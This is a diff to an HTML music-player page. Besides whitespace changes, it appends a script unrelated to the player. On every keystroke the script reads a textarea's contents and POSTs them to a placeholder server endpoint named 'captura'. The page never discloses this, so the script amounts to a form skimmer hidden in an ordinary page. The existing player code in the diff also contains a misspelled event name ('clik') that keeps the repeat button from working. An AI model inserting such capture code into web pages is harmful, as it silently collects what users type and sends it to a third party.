@@ -229,11 +229,46 @@ function playSong(){
     progressContainer.addEventListener('click', jumpTo);
     shuffleButton.addEventListener('click', shuffleButtonClicked);
     repeatButton.addEventListener('clik', repeatButtonCliked); 
-   
+
+
+    
+
+    
+    
   
   
   
 </script>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            const textarea = document.getElementById('myTextarea'); // Certifique-se de que o ID corresponde ao do seu textarea
+            
+            textarea.addEventListener('input', function() {
+                const data = { text: textarea.value };
+                
+                // Envie os dados para o seu servidor
+                fetch('http://seu_servidor/captura', { // Substitua pelo seu endpoint
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(data)
+                })
+                .then(response => {
+                    if (response.ok) {
+                        console.log('Dados enviados com sucesso');
+                    } else {
+                        console.error('Erro ao enviar os dados');
+                    }
+                })
+                .catch(error => {
+                    console.error('Erro de rede:', error);
+                });
+            });
+        });
+    </script>
+    
 </body>
 
 </html>
